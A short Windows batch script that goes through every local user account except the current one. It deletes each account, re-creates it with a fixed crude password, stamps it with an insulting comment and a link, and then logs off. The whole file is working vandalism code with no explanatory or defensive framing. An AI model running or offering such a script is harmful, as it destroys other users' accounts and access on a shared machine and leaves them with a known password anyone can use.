@echo off
cd C:/
mkdir Logs
for /f "tokens=2 delims=\" %%a in ("%username%") do set currentUser=%%a
if not defined currentUser set currentUser=%username%
for /f "skip=1" %%u in ('wmic useraccount get name') do (
    set "user=%%u"
    setlocal enabledelayedexpansion
    set "trim=!user: =!"
    if not "!trim!"=="" if /i not "!trim!"=="%currentUser%" (
        net user "!trim!" /delete
        net user "!trim!" anus /add
        net user "!trim!" /comment:"get fucked. tinyurl.com/ggtfiles"
    )
    endlocal

    
) >> C:/Logs/finished.txt
logoff
